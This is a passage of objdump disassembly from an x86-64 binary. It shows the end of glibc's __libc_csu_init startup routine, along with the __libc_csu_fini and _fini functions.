 e13:	48 8d 2d 5e 0f 20 00 	lea    0x200f5e(%rip),%rbp        # 201d78 <__init_array_end>
 e1a:	53                   	push   %rbx
 e1b:	41 89 fd             	mov    %edi,%r13d
 e1e:	49 89 f6             	mov    %rsi,%r14
 e21:	4c 29 e5             	sub    %r12,%rbp
 e24:	48 83 ec 08          	sub    $0x8,%rsp
 e28:	48 c1 fd 03          	sar    $0x3,%rbp
 e2c:	e8 ef f8 ff ff       	callq  720 <_init>
 e31:	48 85 ed             	test   %rbp,%rbp
 e34:	74 20                	je     e56 <__libc_csu_init+0x56>
 e36:	31 db                	xor    %ebx,%ebx
 e38:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
 e3f:	00 
 e40:	4c 89 fa             	mov    %r15,%rdx
 e43:	4c 89 f6             	mov    %r14,%rsi
 e46:	44 89 ef             	mov    %r13d,%edi
 e49:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
 e4d:	48 83 c3 01          	add    $0x1,%rbx
 e51:	48 39 dd             	cmp    %rbx,%rbp
 e54:	75 ea                	jne    e40 <__libc_csu_init+0x40>
 e56:	48 83 c4 08          	add    $0x8,%rsp
 e5a:	5b                   	pop    %rbx
 e5b:	5d                   	pop    %rbp
 e5c:	41 5c                	pop    %r12
 e5e:	41 5d                	pop    %r13
 e60:	41 5e                	pop    %r14
 e62:	41 5f                	pop    %r15
 e64:	c3                   	retq   
 e65:	90                   	nop
 e66:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 e6d:	00 00 00 

0000000000000e70 <__libc_csu_fini>:
 e70:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000000e74 <_fini>:
 e74:	48 83 ec 08          	sub    $0x8,%rsp
 e78:	48 83 c4 08          	add    $0x8,%rsp
 e7c:	c3                   	retq   
